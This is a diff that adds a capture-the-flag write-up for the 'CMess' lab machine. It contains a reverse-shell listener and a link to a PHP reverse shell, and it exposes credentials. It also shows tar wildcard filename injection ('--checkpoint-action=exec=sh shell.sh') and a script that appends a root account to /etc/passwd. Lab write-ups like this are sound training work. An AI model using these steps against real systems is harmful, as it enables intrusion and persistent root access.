@@ -60,6 +60,124 @@ grep -v '290 W' results.txt
 
 <figure><img src="../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>
 
+I added dev.cmess.thm to my host file and found this page
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+We were able to login to the admin portal with these credentials
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```
+Username: andre@cmess.thm
+Password: KPFTN_f2yxe%
+```
+
+## Initial Shell
+
+**Exploit:** [https://www.exploit-db.com/raw/51569](https://www.exploit-db.com/raw/51569)
+
+
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+The shell they use is bad so I upload a new one to get a reverse shell instead
+
+**Shell Link:** [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+
+
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Get autocomplete
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+
+
+We find andre's password in a backup file
+
+**Victim**
+
+```
+cd /opt
+ls -lah
+cat .password.bak 
+```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+## TCP/80 - HTTP
+
+**Kali**
+
+```
+ssh andre@$VICTIM
+Password: UQfsdCB7aAP6
+```
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+## Privlege Escalation
+
+**Exploit:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cd /home/andre/backups
+mkdir priv
+cd priv
+touch ./--checkpoint=1
+touch './--checkpoint-action=exec=sh shell.sh'
+vi shell.sh
+```
+
+**shell.sh**
+
+```
+#!/bin/bash
+
+echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su new
+Password: 123
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
 
 
 
